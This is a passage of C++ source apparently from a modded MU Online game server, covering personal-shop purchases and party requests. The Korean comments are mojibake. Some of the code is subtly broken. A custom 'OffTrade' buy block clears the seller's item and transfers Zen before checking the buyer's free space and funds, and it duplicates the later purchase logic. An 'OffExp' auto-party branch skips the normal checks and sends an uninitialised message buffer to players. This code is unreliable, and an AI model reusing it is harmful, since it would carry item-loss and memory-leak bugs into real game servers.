					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 7);

					return;
				}

				DWORD dwCost = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;

				if ( gObjCheckMaxZen(lpObj->m_Index, dwCost) == FALSE )
				{
					LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Exceeding Zen of the Host",
						gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
						lpObj->AccountID, lpObj->Name);
					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

					return;
				}
				
				BYTE btNewItemPos = 0;
				btNewItemPos = ::gObjOnlyInventoryInsertItem(aSourceIndex, lpObj->Inventory1[lpMsg->btItemPos]);

				iITEM_LOG_TYPE = lpObj->Inventory1[lpMsg->btItemPos].m_Type;
				iITEM_LOG_LEVEL = lpObj->Inventory1[lpMsg->btItemPos].m_Level;
				iITEM_LOG_DUR = lpObj->Inventory1[lpMsg->btItemPos].m_Durability;
				iITEM_LOG_SERIAL = lpObj->Inventory1[lpMsg->btItemPos].m_Number;
				::gObjInventoryItemSet_PShop(lpObj->m_Index, lpMsg->btItemPos, -1);
				lpObj->Inventory1[lpMsg->btItemPos].Clear();
				::GCInventoryItemDeleteSend(lpObj->m_Index, lpMsg->btItemPos, TRUE);
				gObj[aSourceIndex].Money -= dwCost;
				lpObj->Money += dwCost;
				::GCMoneySend(aSourceIndex, gObj[aSourceIndex].Money);
				::GCMoneySend(lpObj->m_Index, lpObj->Money);
				::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, btNewItemPos, 1);
				::CGPShopAnsSoldItem(lpObj->m_Index, aSourceIndex, lpMsg->btItemPos);

				if ( btNewItemPos == 0xFF )
				{
					LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] No Room to Buy Item",
						gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name,
						lpObj->AccountID, lpObj->Name);
					::CGPShopAnsBuyItem(aSourceIndex, lpObj->m_Index, 0, 8);

					return;
				}
				    LogAddTD("[OffTrade][PShop] [%s][%s][%s] PShop Item Buy Request Succeed : [%s][%s][%s] (Price=%d ZEN, ItemType:%d (%s), ItemLevel:%d, ItemDur:%d, Serial:%d",
					gObj[aSourceIndex].AccountID, gObj[aSourceIndex].Name, gObj[aSourceIndex].Ip_addr,
					lpObj->AccountID, lpObj->Name, lpObj->Ip_addr, dwCost, iITEM_LOG_TYPE,
					ItemAttribute[iITEM_LOG_TYPE].Name, iITEM_LOG_LEVEL, iITEM_LOG_DUR, iITEM_LOG_SERIAL);
				}

             
			if (gObj[aSourceIndex].Money < lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue) 
            {
				// �ش� �����ۿ� ���� ���� ���ڸ���.
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Lack of Zen",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					lpObj->AccountID,
					lpObj->Name
					);
				CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 7);		// ��� 7 : ���� ���ڶ�
				return;
			}
			
			// ������� �Դٸ� �������� �� �� �ִ�.
			INT iPShopItemValue = lpObj->Inventory1[lpMsg->btItemPos].m_iPShopValue;

#ifdef MODIFY_ZEN_MAX_20040414
			// ���λ��� ������ �ִ� �� �������� �˻��Ѵ�.
			if( !gObjCheckMaxZen( lpObj->m_Index, iPShopItemValue ) )
			{
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] Exceeding Zen of the Host",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					lpObj->AccountID,
					lpObj->Name
					);
				CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 8);		// ��� 9 : ���� ���ο� �ִ� �� �������� �Ѿ��.

				return;
			}
#endif

			BYTE btResult = false;
			btResult = gObjOnlyInventoryInsertItem(aSourceIndex, lpObj->Inventory1[lpMsg->btItemPos]);		// btResult ���� ���Ե� ĭ��ȣ�� �Ѿ�´�.
			if (btResult == 0xFF) {
				LogAddTD("[PShop] [%s][%s] PShop Item Buy Request Failed : [%s][%s] No Room to Buy Item",
					gObj[aSourceIndex].AccountID,
					gObj[aSourceIndex].Name,
					lpObj->AccountID,
					lpObj->Name
					);
				CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, 0, 8);		// ��� 8 : ������ �������� ���� �� ������ ����.
				return;
			}

			// ������ �α׸� ����� ���� ������ �ӽ����� �Ѵ�.
			iITEM_LOG_TYPE		= lpObj->Inventory1[lpMsg->btItemPos].m_Type;
			iITEM_LOG_LEVEL		= lpObj->Inventory1[lpMsg->btItemPos].m_Level;
			iITEM_LOG_DUR		= lpObj->Inventory1[lpMsg->btItemPos].m_Durability;
			iITEM_LOG_SERIAL	= lpObj->Inventory1[lpMsg->btItemPos].m_Number;

			// ������ �������� �����Ѵ�. - �� �Լ��� ���ϰ��� ������ TRUE �̴�.
			gObjInventoryItemSet_PShop(lpObj->m_Index, lpMsg->btItemPos, 0xFF);
			lpObj->Inventory1[lpMsg->btItemPos].Clear();
			GCInventoryItemDeleteSend(lpObj->m_Index, lpMsg->btItemPos, 1);

			// ���⼭ ������ ���� �����ϰ� �ݴ��� �÷��ش�.
			gObj[aSourceIndex].Money -= iPShopItemValue;
			lpObj->Money += iPShopItemValue;
			GCMoneySend(aSourceIndex, gObj[aSourceIndex].Money);
			GCMoneySend(lpObj->m_Index, lpObj->Money);

			// ���������� ������ ������ ����Ʈ�� �ٽ� �����ش�.
//			GCItemListSend (aSourceIndex);
//			GCItemListSend (lpObj->m_Index);

			CGPShopAnsBuyItem (aSourceIndex, lpObj->m_Index, btResult, true);		// ��� 1 : ���λ��� ������ ��ȯ ����
			CGPShopAnsSoldItem (lpObj->m_Index, aSourceIndex, lpMsg->btItemPos);

#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
			LogAddTD("[PShop] [%s][%s][%s] PShop Item Buy Request Succeed : [%s][%s][%s] (Price=%d, ItemType:%d (%s), ItemLevel:%d, ItemDur:%d, Serial:%u",
#else
			LogAddTD("[PShop] [%s][%s][%s] PShop Item Buy Request Succeed : [%s][%s][%s] (Price=%d, ItemType:%d (%s), ItemLevel:%d, ItemDur:%d, Serial:%d",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				gObj[aSourceIndex].AccountID,
				gObj[aSourceIndex].Name,
				gObj[aSourceIndex].Ip_addr,
				lpObj->AccountID,
				lpObj->Name,
				lpObj->Ip_addr,
				iPShopItemValue,
				iITEM_LOG_TYPE,
				ItemAttribute[iITEM_LOG_TYPE].Name,
				iITEM_LOG_LEVEL,
				iITEM_LOG_DUR,
				iITEM_LOG_SERIAL
				);


			if (PShop_CheckInventoryEmpty(lpObj->m_Index) == true) {
				// ���� ���λ��� �����ڰ� ������ �� �ȾҴٸ� ���λ����� �ݾ��ش�.
				LogAddTD("[PShop] [%s][%s] Sold All Items - Auto Closing PShop",
					lpObj->AccountID,
					lpObj->Name
					);

				GCServerMsgStringSend(lMsg.Get(1219), lpObj->m_Index, 1);		// "����Ͻ� ���λ��� ��ǰ�� ��� �ȷȽ��ϴ�."

				lpObj->m_bPShopOpen = false;
				memset (lpObj->m_szPShopText, 0, MAX_PSHOP_TEXT);
				
				CGPShopAnsClose (lpObj->m_Index, TRUE);
			}
			else {
				// �ƴϸ� ���� ������ ����Ǿ��ٰ� �˷��ش�.
				lpObj->m_bPShopItemChange = true;
			}
		}
	}
	__finally {
		lpObj->m_bPShopTransaction = false;
	}
}


//----------------------------------------------------------------------------
// SC [0x3F][0x06] ���λ������� ������ �����ϰڴٴ� ��û�� ���� ����
VOID CGPShopAnsBuyItem (int aSourceIndex, int aTargetIndex, int iItemPos, BYTE btResult)
{
	PMSG_ANS_BUYITEM_FROM_PSHOP pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x06, sizeof( pMsg ));

	pMsg.NumberH	= HIBYTE(aTargetIndex);
	pMsg.NumberL	= LOBYTE(aTargetIndex);
	pMsg.btItemPos	= iItemPos;
	pMsg.Result		= btResult;
	ItemByteConvert( pMsg.cItemInfo, gObj[aSourceIndex].Inventory1[iItemPos] );

	DataSend (aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


//----------------------------------------------------------------------------
// SC [0x3F][0x07] �ٸ� ����� ���λ��� â�� �����ִ� �ݾҴ�.
VOID CGPShopReqCloseDeal (LPPMSG_REQ_PSHOPDEAL_CLOSE lpMsg, int aIndex)
{
	if (!gObjIsConnected(aIndex)) {
		return;
	}

	gObj[aIndex].m_bPShopWantDeal = false;
	gObj[aIndex].m_iPShopDealerIndex = -1;
	memset (gObj[aIndex].m_szPShopDealerName, 0, MAX_IDSTRING);
}


//----------------------------------------------------------------------------
// SC [0x3F][0x08] �� ���λ����� �������� �ȷȴٴ� �޽��� (A�� B���� �������� �Ⱦ���)
VOID CGPShopAnsSoldItem (int aSourceIndex, int aTargetIndex, int iItemPos)
{
	PMSG_ANS_SOLDITEM_FROM_PSHOP pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x08, sizeof( pMsg ));

	pMsg.btItemPos	= iItemPos;
	memcpy(pMsg.btName, gObj[aTargetIndex].Name, MAX_IDSTRING);

	DataSend (aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


//----------------------------------------------------------------------------
// SC [0x3F][0x12] // ���� ���λ����� ���� �ִ� ����� ������ �ݾҴ�.
VOID CGPShopAnsDealerClosedShop (int aSourceIndex, int aTargetIndex)
{
	PMSG_REQ_DEALER_CLOSED_SHOP pMsg;
	PHeadSubSetB((LPBYTE)&pMsg, 0x3F, 0x12, sizeof( pMsg ));

	pMsg.NumberH = HIBYTE(aTargetIndex);
	pMsg.NumberL = LOBYTE(aTargetIndex);

	DataSend (aSourceIndex, (LPBYTE)&pMsg, pMsg.h.size);
}


#endif


//----------------------------------------------------------------------------
// [0x40] ��Ƽ��û�� �޴´�.
void CGPartyRequestRecv(LPPMSG_PARTYREQUEST lpMsg, int aIndex)
{
	int number;
	PMSG_PARTYREQUESTSEND	pMsg;

	int pnumber = -1;
	char szTemp[256];

	number = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if( number < 0 || number > MAX_OBJECT-1 ) return; 

	//DevGamesX 01/05/2018 - OffExp Auto Party
	if ( gObj[number].OffExp == true )
	{
		if ( gObj[number].PartyNumber < 0 )
		{
			gObj[number].PartyNumber = gParty.Create(number, gObj[number].DBNumber, gObj[number].Level);
		}

		if ( gObj[aIndex].PartyNumber < 0 )
		{
			gObj[aIndex].PartyNumber = gParty.Create(aIndex, gObj[aIndex].DBNumber, gObj[aIndex].Level);
		}

		if ( gObj[aIndex].PartyNumber >= 0  )
		{
			pnumber = gObj[aIndex].PartyNumber;
			int iPartyPos = gParty.Add(gObj[aIndex].PartyNumber, number, gObj[number].DBNumber, gObj[number].Level);

			if ( iPartyPos >= 0 )
			{
				gObj[number].PartyNumber = gObj[aIndex].PartyNumber;
				//wsprintf(szTemp, lMsg.Get(MSGGET(4, 83)), gObj[number].Name);
				::GCServerMsgStringSend(szTemp, aIndex, 1);
				//wsprintf(szTemp, lMsg.Get(MSGGET(4, 83)), gObj[aIndex].Name);
				::GCServerMsgStringSend(szTemp, number, 1);
				gParty.Paint(pnumber);
			}
		}

		if ( pnumber >= 0 )
		{
			CGPartyListAll(pnumber);
		}

		return;
	} 

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[number]) == FALSE ) {
		GCResultSend(aIndex, 0x41, 0x03);
		return;
	}
	if( gObj[aIndex].CloseCount >= 0 || gObj[number].CloseCount >= 0 ) 
	{
		GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

#ifdef MODIFY_REQUESTNPC_HACK
	if (gObj[number].Type != OBJTYPE_CHARACTER)
	{
		LogAddC(LOGC_RED,"[HACKTOOL] : NPC-PartyRequest npc:%d ip:%s account:%s name:%s State:%d", 
			gObj[number].Class, 
			gObj[aIndex].Ip_addr,
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name, 
			gObj[aIndex].Connected);
		
		CloseClient(aIndex);
		return;
	}
#endif // MODIFY_REQUESTNPC_HACK

#ifdef ADD_NEWPVP_PKFIELD
	if ( g_NewPVP.IsDuel(gObj[aIndex]) || g_NewPVP.IsDuel(gObj[number]) )
	{
		// "�����߿��� ��Ƽ�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3424), aIndex, 1);
		return;
	}

	if ( g_NewPVP.IsObserver(gObj[aIndex]) )
	{
		// "�����߿��� ��Ƽ�� �� �� �����ϴ�."
		GCServerMsgStringSend(lMsg.Get(3425), aIndex, 1);
		return;
	}
#endif // ADD_NEWPVP_PKFIELD

#ifdef FOR_BLOODCASTLE
/*
	if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber)) {	
		// ���� ĳ�� �ȿ� �ִٸ� ��Ƽ�αⰡ �������� üũ
		if (!g_BloodCastle.CheckCanParty(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1)) {
			// ȹ���� ����ġ�� ���� �˷��ش�.
			GCServerMsgStringSend(lMsg.Get(1173), aIndex, 1);		// "���� ����ĳ���� ���� �����Ƿ� ��Ƽ�� ���� �� �����ϴ�."
			return;
		}
	}
*/
#endif

#ifdef CHAOSCASTLE_SYSTEM_20040408		// ī���� ĳ�� �ȿ����� ��Ƽ�� ���� �� ����
	if (CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber)) {
		GCServerMsgStringSend(lMsg.Get(1222), aIndex, 1);		// "ī���� ĳ�� �ȿ����� ��Ƽ�� ��û�� �� �����ϴ�."
		return;
	}
#endif

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013	// ȯ�� ��� �ȿ����� ��Ƽ�� ���� �� ����, wtf ���� ������Ʈ
	if(CHECK_ILLUSION_TEMPLE(gObj[aIndex].MapNumber)) 
	{
		GCServerMsgStringSend(lMsg.Get(3397), aIndex, 1);		// "ȯ����� �ȿ����� ��Ƽ�� ��û�� �� �����ϴ�."
		return;
	}
#endif
	
#ifdef AUTH_GAMESERVER_CHECKKEY
	if( szAuthKey[4] != AUTH_CHECK_04 )
		DestroyGIocp();
#endif

	LogAddL("Party result : %d %d %d %d", gObj[aIndex].CloseCount, gObj[number].CloseCount, gObj[aIndex].Connected, gObj[number].Connected);
	LogAddL("%s %s", gObj[aIndex].Name, gObj[number].Name);
	// �ڽ��� ��û�ϰų� �ŷ��� �϶��� 
	
	if( gObj[aIndex].m_IfState.use > 0 ) {
		GCResultSend(aIndex, 0x41, 0x00);
		return;
	}
	
	// �ٸ����� �ϰ� �ִ��� üũ 
	if( gObj[number].m_IfState.use > 0 ) {
		GCResultSend(aIndex, 0x41, 0x00);
		return;
	}
	
	if( (gObj[number].m_Option&OPTION_TRADE) != OPTION_TRADE )
	{
		GCResultSend(aIndex, 0x41, 0x01);
		return;
	}

	// ���� ��Ƽ ������ �̰� ������ �ƴϸ� ����..
	if( gObj[aIndex].PartyNumber >= 0 ) 
	{
		int user, dbnumber;
		gParty.GetIndexUser(gObj[aIndex].PartyNumber, 0, user, dbnumber);
		if( (user < 0) || (user!=aIndex && gObj[aIndex].DBNumber!=dbnumber) )
		{
			GCResultSend(aIndex, 0x41, 0x00);
			return;
		}		
	}
	
	// ���� ��Ƽ ��û �� �̶��
	if( gObj[aIndex].PartyTargetUser >= 0 ) return;

	if( gObj[number].PartyNumber >= 0 ) {
		GCResultSend(aIndex, 0x41, 0x04);	// ��밡 �ٸ� ��Ƽ�� �̹� ���ԵǾ� �ֽ��ϴ�.
		return;
	}
	// ����ڰ� �ִٸ� ����ڰ� ��Ƽ�� �������ΰ� �˻�.
	//if( gObj[number].PartyNumber >= 0 ) return;
	if( gObj[number].PartyTargetUser >= 0 ) {
		GCResultSend(aIndex, 0x41, 0x00);
		return;
	}

		// ��Ƽ ������ �߿� ������ ���� ���� ����ڴ�?
	int maxlevel=0, minlevel=0;
#ifndef UPDATE_LOWLEVEL_SUPPORT_1_20051215
	if( gObj[aIndex].PartyNumber >= 0 )
	{
		if( gParty.GetLevel(gObj[aIndex].PartyNumber, maxlevel, minlevel) == TRUE )
		{
			if( max(maxlevel,gObj[number].Level)-min(maxlevel,gObj[number].Level) > PARTY_LENGTH )
			{
				GCResultSend(aIndex, 0x41, 0x05);				
				LogAdd(lMsg.Get(701), PARTY_LENGTH, gObj[aIndex].Name, gObj[aIndex].Level,gObj[number].Name, gObj[number].Level);
				return;
			}
			if( max(minlevel,gObj[number].Level)-min(minlevel,gObj[number].Level) > PARTY_LENGTH )
			{
				GCResultSend(aIndex, 0x41, 0x05);
				LogAdd(lMsg.Get(701), PARTY_LENGTH, gObj[aIndex].Name, gObj[aIndex].Level,gObj[number].Name, gObj[number].Level);
				return;
			}
		}
	}
	else // ���� ��Ƽ�� �̶��..  
	{
		if( max(gObj[aIndex].Level,gObj[number].Level)-min(gObj[aIndex].Level,gObj[number].Level) > PARTY_LENGTH )
		{
			GCResultSend(aIndex, 0x41, 0x05);
			LogAdd(lMsg.Get(701), PARTY_LENGTH, gObj[aIndex].Name, gObj[aIndex].Level,gObj[number].Name, gObj[number].Level);
			return;
		}
	}
#endif

	
	gObj[aIndex].m_IfState.use    = 1;
	gObj[aIndex].m_IfState.type   = I_PARTY;
	gObj[aIndex].m_IfState.state  = 0;
	gObj[number].m_IfState.use    = 1;
	gObj[number].m_IfState.type   = I_PARTY;
	gObj[number].m_IfState.state  = 0;
	gObj[aIndex].TargetNumber     = number;
	gObj[number].TargetNumber     = aIndex;
	gObj[aIndex].m_InterfaceTime  = GetTickCount();
	gObj[number].m_InterfaceTime  = GetTickCount();

	gObj[aIndex].PartyTargetUser  = number;
	
	// ����ڰ� ��Ƽ�� ���ٸ� ��Ƽ�� ��û�Ѵ�.
	PHeadSetB((LPBYTE)&pMsg, 0x40, sizeof( pMsg ));
	pMsg.NumberH    = HIBYTE(aIndex);
	pMsg.NumberL    = LOBYTE(aIndex);
	DataSend(number, (LPBYTE)&pMsg, pMsg.h.size);
}

// ��Ƽ ��û�� ���� ���..
void CGPartyRequestResultRecv(LPPMSG_PARTYREQUESTRESULT lpMsg, int aIndex)
{
	int number;	
	BYTE result=0x00;
	char szTemp[256];
	int pnumber=-1;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;

	number = MAKEWORD(lpMsg->NumberL, lpMsg->NumberH);
	if( number < 0 || number > MAX_OBJECT-1 ) return; 

	// �������� �ƴϰų� ���� �� �̶��.
	if( gObjIsConnected(&gObj[aIndex]) == FALSE ) 
	{
		return;
	}
	// OK�� �����ٸ�..
	// ����ڰ� �ִ��� �˻�.
	if( gObjIsConnected(&gObj[number]) == FALSE ) 
	{		
		GCResultSend(aIndex, 0x41, 0x04);	// ��밡 ������ �����ߴ�.
	}
	else result = 0x01;

#ifdef MODIFY_REQUESTNPC_HACK
	if (gObj[number].Type != OBJTYPE_CHARACTER)
	{
		LogAddC(LOGC_RED,"[HACKTOOL] : NPC-TradeRequest(Result) npc:%d ip:%s account:%s name:%s State:%d", 
			gObj[number].Class, 
			gObj[aIndex].Ip_addr,
			gObj[aIndex].AccountID, 
			gObj[aIndex].Name, 
			gObj[aIndex].Connected);
		
		CloseClient(aIndex);
		return;
	}
#endif // MODIFY_REQUESTNPC_HACK

#ifdef MODIFY_CHAOSCASTLE_BUGFIX_20060919		// ���� ���� �ƴϸ� ��Ƽ �ȵǵ��� ����
	// ��Ƽ ��û�ڿ� ��û���� ����� ���� ���� �ƴ϶�� ��Ƽ�� ����Ѵ�.
	if( gObj[number].MapNumber != gObj[aIndex].MapNumber )
	{
		result = 0x00;
		GCResultSend( number, 0x41, 0x00 );
	}

	// ����ڰ� ī����ĳ�� �ȿ� �ִٸ� ��Ƽ�� ���� �� ����.
	if( CHECK_CHAOSCASTLE( gObj[aIndex].MapNumber ) )  
	{
		GCServerMsgStringSend( lMsg.Get( 1222 ), aIndex, 1 );		// "ī���� ĳ�� �ȿ����� ��Ƽ�� ��û�� �� �����ϴ�."
		result = 0x00;
		GCResultSend( number, 0x41, 0x00 );
	}
#endif
	
#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ȯ�� ��������� ����ڰ� ��Ƽ�� �ɼ� ����
	if( CHECK_ILLUSION_TEMPLE( gObj[aIndex].MapNumber) )
	{
		result = 0x00;
		GCResultSend( number, 0x41, 0x00 );
	}
#endif

	// CANCEL �� �����ٸ�
	if( lpMsg->Result == 0x00 ) 
	{		
		result = 0x00;
		GCResultSend(number, 0x41, 0x01);
	}

	// ��밡 ��Ƽâ ���°� �ƴ϶��..
	if( gObj[number].m_IfState.use == 0 || gObj[number].m_IfState.type != I_PARTY )
	{
		result = 0x00;
		GCResultSend(number, 0x41, 0x00);
		//LogAddL("%s ��Ƽ ���°� �ƴϴ�.", gObj[number].Name);
	}
	
	// ���� ��Ƽâ ���°� �ƴ϶��..
	if( gObj[aIndex].m_IfState.use == 0 || gObj[aIndex].m_IfState.type != I_PARTY )
	{
		result = 0x00;
		GCResultSend(number, 0x41, 0x00);
		//LogAddL("%s ��Ƽ ���°� �ƴϴ�.", gObj[aIndex].Name);
	}

	if( result == 0x01 )
	{		
		// ��Ƽ�� ��û�� ����� ��Ƽ�� ������ �ȴ�.
		if( gObj[number].PartyNumber < 0 ) 
		{
			gObj[number].PartyNumber = gParty.Create(number, gObj[number].DBNumber, gObj[number].Level);
		}

		// ��Ƽ�� ����� ���ٸ� .. ����ڸ� �߰��Ѵ�.
		if( gObj[number].PartyNumber >= 0 ) 
		{
			pnumber = gObj[number].PartyNumber;
			int addresult = gParty.Add(gObj[number].PartyNumber, aIndex, gObj[aIndex].DBNumber, gObj[aIndex].Level);

			if( addresult >= 0 )
			{
				gObj[aIndex].PartyNumber = gObj[number].PartyNumber;
				result = 0x01;

				wsprintf(szTemp, lMsg.Get(1107), gObj[aIndex].Name);
				GCServerMsgStringSend(szTemp, number, 1);
				wsprintf(szTemp, lMsg.Get(1107), gObj[number].Name);
				GCServerMsgStringSend(szTemp, aIndex, 1);
				gParty.Paint(pnumber);				
			}
			else if( addresult == -1 )	// ��Ƽ�� ��á�ٸ�
			{				
				GCResultSend(number, 0x41, 0x02);
				GCResultSend(aIndex, 0x41, 0x02);
			}
			else if( addresult == -2 )	// �̹� ������ 
			{
				result = 0x02;
				wsprintf(szTemp, lMsg.Get(1108), gObj[aIndex].Name);
				GCServerMsgStringSend(szTemp, aIndex, 1);
			}
		}		
	}
	
	// ������ ��Ƽ���� ��������
	if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_PARTY )
	{
		gObj[aIndex].m_IfState.use      = 0;
		gObj[aIndex].PartyTargetUser	= -1;		
		
		//LogAddL("%s ��Ƽ ���� ����", gObj[aIndex].Name);
	}
	
	// ������ ��Ƽ���� ��������
	if( gObj[number].m_IfState.use && gObj[number].m_IfState.type == I_PARTY )
	{
		gObj[number].m_IfState.use		= 0;
		gObj[number].PartyTargetUser	= -1;
		
		//LogAddL("%s ��Ƽ ���� ����", gObj[number].Name);
	}
	
	if( pnumber >= 0 ) CGPartyListAll(pnumber);
}

//----------------------------------------------------------------------------
// [0x42] ��Ƽ�� ����Ʈ�� �����޶�� ��û�ߴ�.
void CGPartyList(int aIndex)
{
	PMSG_PARTYLISTCOUNT	pCount;
	PMSG_PARTYLIST		pList;
	char sendbuf[512];
	int  lOfs=0;
	int  number;

	if( PacketCheckTime(&gObj[aIndex]) == FALSE ) return;
	
	PHeadSetB((LPBYTE)&pCount, 0x42, sizeof( pCount ));

	pCount.Count        = 0;
	pCount.Result       = 0x00;

	// ���ԵǾ� �ִ� ��Ƽ
	int pnumber = gObj[aIndex].PartyNumber;
	if( pnumber >= 0 )
	{
		pCount.Count = gParty.GetCount(pnumber);
	}

	lOfs += sizeof(pCount);
	if( pCount.Count )
	{
		for( int n=0; n<MAX_PARTYUSER; n++)
		{			
			number = gParty.m_PartyS[pnumber].Number[n];
			if( number >= 0 )
			{
				if( gObjIsConnected(&gObj[number], gParty.m_PartyS[pnumber].DbNumber[n]) == TRUE ) 
				{
					memset(&pList, 0, sizeof(pList));
					memcpy(pList.szId,  gObj[number].Name, MAX_IDSTRING);
					pList.Number    = n;
					pList.MapNumber = gObj[number].MapNumber;
					pList.X			= (BYTE)gObj[number].X;
					pList.Y			= (BYTE)gObj[number].Y;

					pList.Life		= (int)gObj[number].Life;
					pList.MaxLife	= (int)(gObj[number].MaxLife+gObj[number].AddLife);
					memcpy(sendbuf+lOfs, (char*)&pList, sizeof(PMSG_PARTYLIST));
					lOfs += sizeof(PMSG_PARTYLIST);
				}
			}
		}
		pCount.Result = 0x01;
	}
	pCount.h.size = lOfs;
	memcpy(sendbuf, (char*)&pCount, sizeof(pCount));

	DataSend(aIndex, (LPBYTE)sendbuf, lOfs);
}

//----------------------------------------------------------------------------
// [0x42] ��Ƽ�� ����Ʈ�� �����޶�� ��û�ߴ�.
void CGPartyListAll(int pnumber)
{
	PMSG_PARTYLISTCOUNT	pCount;
	PMSG_PARTYLIST		pList;
	char sendbuf[512];
	int  lOfs=0;
	int  number;
	int  n;
	
	// ���ԵǾ� �ִ� ��Ƽ
	//int pnumber = gObj[aIndex].PartyNumber;
	if( pnumber < 0 ) return;
	if( gParty.IsParty(pnumber) == FALSE ) return;

	PHeadSetB((LPBYTE)&pCount, 0x42, sizeof( pCount ));

	pCount.Result       = 0x00;
	pCount.Count		= gParty.GetCount(pnumber);
	if( pCount.Count == 0 ) return;

	pCount.Result = 0x01;
	lOfs += sizeof(pCount);
	for( n=0; n<MAX_PARTYUSER; n++)
	{			
		number = gParty.m_PartyS[pnumber].Number[n];
		if( number >= 0 )
		{
			if( gObjIsConnected(&gObj[number], gParty.m_PartyS[pnumber].DbNumber[n]) == TRUE ) 
			{
				memset(&pList, 0, sizeof(pList));
				memcpy(pList.szId,  gObj[number].Name, MAX_IDSTRING);
				pList.Number    = n;
				pList.MapNumber = gObj[number].MapNumber;
				pList.X			= (BYTE)gObj[number].X;
				pList.Y			= (BYTE)gObj[number].Y;
				pList.Life		= (int)gObj[number].Life;
				pList.MaxLife	= (int)gObj[number].MaxLife;
				memcpy(sendbuf+lOfs, (char*)&pList, sizeof(PMSG_PARTYLIST));
				lOfs += sizeof(PMSG_PARTYLIST);
			}
		}
	}
	pCount.h.size = lOfs;
	memcpy(sendbuf, (char*)&pCount, sizeof(pCount));

	for( n=0; n<MAX_PARTYUSER; n++)
	{			
		number = gParty.m_PartyS[pnumber].Number[n];
		if( number >= 0 )
		{
			DataSend(number, (LPBYTE)sendbuf, lOfs);
		}
	}
}

//----------------------------------------------------------------------------
// [0x43] ��Ƽ���� Ż�� ��û
void CGPartyDelUser(LPPMSG_PARTYDELUSER lpMsg, int aIndex)
{
	int usernumber=-1, dbnumber=-1;
	int count;
	int number, pnumber;

	// ��Ƽ�� ���ٸ� ����
	if( gObj[aIndex].PartyNumber < 0 ) 
	{
		LogAdd("No Party %s %s", gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}

	// ������ �����ϴ��� Ȯ��
	if( gParty.GetIndexUser(gObj[aIndex].PartyNumber, lpMsg->Number, usernumber, dbnumber) == FALSE )
	{
		LogAdd("User Not found");
		return;
	}
	
	// ������ �������� ������
	if( usernumber < 0 ) 
	{
		LogAdd("User Not found");
		return;
	}

#ifdef FOR_BLOODCASTLE
/*
	if (CHECK_BLOODCASTLE(gObj[aIndex].MapNumber)) {	
		// ���� ĳ�� �ȿ� �ִٸ� ��Ƽ������ �������� üũ
		if (!g_BloodCastle.CheckCanParty(gObj[aIndex].MapNumber - MAP_INDEX_BLOODCASTLE1)) {
			GCServerMsgStringSend(lMsg.Get(1172), aIndex, 1);		// "���� ����ĳ���� ���� �����Ƿ� ��Ƽ�� ������ �� �����ϴ�."
			return;
		}
	}
*/
#endif

	pnumber = gObj[aIndex].PartyNumber;
	if( pnumber < 0 ) {
		LogAdd("%s %d",__FILE__,__LINE__);
		return;
	}

	count   = gParty.GetCount(pnumber);
	if( count < 1 ) {
		LogAdd("%s %d",__FILE__,__LINE__);
		return;
	}

	// �����϶��̰ų� 2�� ���϶�.. ��Ƽ ����
	if( lpMsg->Number == 0 || count <= 2 )
	{
#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328	// ��� �̺�Ʈ �� �ϰ�� ������ ��Ƽ�����ص� ��Ƽ ����
		if(CHECK_ILLUSION_TEMPLE(gObj[usernumber].MapNumber) 
			&& (lpMsg->Number == 0 && count > 2))
		{
			gParty.Delete(pnumber, lpMsg->Number);
			count = gParty.GetCount(gObj[aIndex].PartyNumber);
			gObj[usernumber].PartyNumber = -1;
			gObj[usernumber].PartyTargetUser = -1;
			gParty.UpdatePKPartyPanalty(pnumber);
			gParty.ChangeLeader(pnumber);
			GCPartyDelUserSend(usernumber);
			CGPartyListAll(pnumber);

			if(count == 0)
			{
				gParty.Destroy(pnumber);
			}

			return;
		}		
#endif

#ifdef MODIFY_ILLUSIONTEMPLE_BUGFIX_6_200708013	// ȯ�� ������� �Ѹ��� ������ ���Ƶ� ��Ƽ ����
		if(CHECK_ILLUSION_TEMPLE(gObj[usernumber].MapNumber) && count <= 2)
		{
			gParty.Delete(pnumber, lpMsg->Number);
			count = gParty.GetCount(gObj[aIndex].PartyNumber);
			gObj[usernumber].PartyNumber = -1;
			gObj[usernumber].PartyTargetUser = -1;
			gParty.UpdatePKPartyPanalty(pnumber);
		
			if(lpMsg == 0)	// �����ϰ��
			{
				gParty.ChangeLeader(pnumber);
